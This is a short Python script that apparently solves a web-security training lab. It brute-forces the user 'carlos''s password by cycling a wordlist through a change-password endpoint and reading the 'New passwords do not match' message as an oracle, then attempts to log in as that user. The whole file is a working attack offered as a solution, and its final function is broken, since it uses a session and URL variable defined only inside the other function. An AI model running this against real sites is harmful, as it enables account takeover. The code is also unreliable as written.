import requests

with open('pass.txt') as f:
	p = f.read().split()

def brute_force():

	s = requests.Session()
	url1 = "https://ac921fa11fcfdd3ec0781fa700620049.web-security-academy.net/login"
	url2 = 'https://ac921fa11fcfdd3ec0781fa700620049.web-security-academy.net/my-account/change-password'
	acc = {'username': 'wiener', 'password': '123456'}
	r1 = s.post(url1, data = acc) 


	for i in p:
		data = {"username": "carlos","current-password": i, "new-password-1": "123456", "new-password-2": "123"}
		r2 = s.post(url2, data = data)
		print('Try password : ' + i)
		if 'New passwords do not match' in r2.text:
			print('Password of carlos is :' + i)
			carlos_pass = i
			break
	return carlos_pass

def slove(p):

	url = "https://ac921fa11fcfdd3ec0781fa700620049.web-security-academy.net/login"
	acc = {'username': 'carlos', 'password': p}
	r1 = s.post(url1, data = acc)

slove(brute_force()) 